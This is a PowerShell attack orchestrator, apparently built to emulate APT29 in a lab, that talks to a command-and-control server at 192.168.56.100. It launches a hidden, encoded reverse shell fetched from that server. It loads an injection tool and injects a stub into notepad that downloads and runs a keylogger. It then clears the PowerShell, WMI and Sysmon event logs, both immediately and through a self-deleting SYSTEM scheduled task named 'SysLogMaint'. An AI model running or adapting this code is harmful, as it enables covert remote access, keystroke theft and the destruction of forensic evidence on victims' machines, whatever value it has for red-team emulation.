function Invoke-OrchestratorMain {
    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    [Net.WebRequest]::DefaultWebProxy = $null

    $PublicDir = "C:\Users\Public\apt29"
    mkdir $PublicDir -Force -EA SilentlyContinue
    $C2 = "https://192.168.56.100:8443"

    # =========================================================
    # IDEMPOTENT CHECK — tranh inject lai trong 30 phut
    # =========================================================
    $sessionMarker = "$PublicDir\.session_injected"
    if (Test-Path $sessionMarker) {
        $age = (Get-Date) - (Get-Item $sessionMarker).LastWriteTime
        if ($age.TotalMinutes -lt 30) {
            # Da inject trong 30 phut qua → exit ngay, KHONG sinh error
            return
        }
    }

    # =========================================================
    # [1] Revshell — CHI spawn neu nc dang listen
    # =========================================================
    try {
        $ncReady = Test-NetConnection -ComputerName '192.168.56.100' -Port 4444 `
            -InformationLevel Quiet -WarningAction SilentlyContinue
        if ($ncReady) {
            $revPayload = "IEX(New-Object Net.WebClient).DownloadString('$C2/revshell.ps1')"
            $revB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($revPayload))
            Start-Process powershell -WindowStyle Hidden `
                -ArgumentList "-NoP","-Exec","Bypass","-Enc",$revB64 `
                -ErrorAction SilentlyContinue
        }
        # nc KHONG listen → SKIP → KHONG spawn → KHONG error → KHONG leak
    } catch {}

    # =========================================================
    # [2] Cho notepad
    # =========================================================
    $np = $null
    for ($i = 0; $i -lt 30; $i++) {
        $np = Get-Process notepad -EA SilentlyContinue | Select -First 1
        if ($np) { break }
        Start-Sleep -Milliseconds 500
    }
    if (-not $np) { return }

    # Check same notepad
    $marker = "$PublicDir\.last_injected_pid"
    if (Test-Path $marker) {
        $lastPid = (Get-Content $marker -Raw).Trim()
        if ($lastPid -eq $np.Id.ToString()) { return }
    }

    # =========================================================
    # [3] Load Invoke-PSInject
    # =========================================================
    try {
        $wc = New-Object Net.WebClient
        $wc.Proxy = $null
        $tool = $wc.DownloadString("$C2/Invoke-PSInject.ps1")
        Invoke-Expression $tool
    } catch { return }

    # =========================================================
    # [4] Stub keylogger
    # =========================================================
    $stubPayload = "[Net.ServicePointManager]::ServerCertificateValidationCallback={`$true};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.WebRequest]::DefaultWebProxy=`$null;`$wc=New-Object Net.WebClient;`$wc.Proxy=`$null;IEX `$wc.DownloadString('$C2/keylogger.ps1')"
    $StubB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($stubPayload))
    if ($StubB64.Length -gt 1200) { return }

    # =========================================================
    # [5] Inject
    # =========================================================
    try {
        Invoke-PSInject -ProcId $np.Id -PoshCode $StubB64
        $np.Id | Out-File $marker -Force
        New-Item $sessionMarker -Force | Out-Null
    } catch { return }

    # =========================================================
    # [6] Delayed clear — task SysLogMaint
    # =========================================================
    $taskName = "SysLogMaint"
    if (-not (Get-ScheduledTask -TaskName $taskName -EA SilentlyContinue)) {
        try {
            $clearArg = '/c wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>nul & ' +
                        'wevtutil cl "Microsoft-Windows-WMI-Activity/Operational" 2>nul & ' +
                        'wevtutil cl "Microsoft-Windows-Sysmon/Operational" 2>nul & ' +
                        'schtasks /Delete /TN "SysLogMaint" /F 2>nul'
            $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument $clearArg
            $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5)
            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
            Register-ScheduledTask -TaskName $taskName -Action $action `
                -Trigger $trigger -Principal $principal -Force | Out-Null
        } catch {}
    }

    # =========================================================
    # [7] Aggressive clear — clear PS log NGAY sau orchestrator
    # =========================================================
    Start-Sleep 3
    $clearNow = 'wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>nul'
    Start-Process cmd.exe -ArgumentList "/c", $clearNow -WindowStyle Hidden -Wait
}

Invoke-OrchestratorMain
